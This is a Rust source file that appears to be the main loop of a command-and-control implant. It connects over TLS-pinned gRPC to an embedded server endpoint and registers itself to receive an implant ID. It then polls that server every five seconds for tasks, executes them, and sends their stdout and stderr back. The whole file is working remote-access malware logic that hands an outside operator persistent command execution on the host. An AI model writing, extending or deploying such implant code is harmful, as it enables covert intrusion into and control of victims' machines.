mod exec;
mod pb;
mod rpc;
mod embed;

use pb::{Registration, TaskRequest, TaskResult};

#[tokio::main]
async fn main() {
    let root_ca = embed::Certs::get("rootCA.pem").unwrap();
    let root_ca = std::str::from_utf8(root_ca.data.as_ref()).unwrap();
    let mut client = rpc::new_client(root_ca, embed::DOMAIN_NAME, embed::ENDPOINT).await.unwrap();

    let implant_id = loop {
        let request = tonic::Request::new(Registration {
            implant_id: "".to_string(),
        });
        match client.register(request).await {
            Ok(response) => break response.into_inner().implant_id,
            Err(_) => std::thread::sleep(std::time::Duration::from_secs(5))
        }
    };

    loop {
        let request = tonic::Request::new(TaskRequest {
            implant_id: implant_id.clone(),
        });

        match client.get_task(request).await {
            Ok(response) => {
                let response = response.into_inner();
                if let Some((stdout, stderr)) = exec::exec_task(&response) {
                    let request = tonic::Request::new(TaskResult {
                        id: response.task_id,
                        stdout,
                        stderr,
                    });
                    client.post_result(request).await.unwrap();
                }
            }
            Err(e) => eprintln!("{:?}", e),
        }

        std::thread::sleep(std::time::Duration::from_secs(5));
    }
}
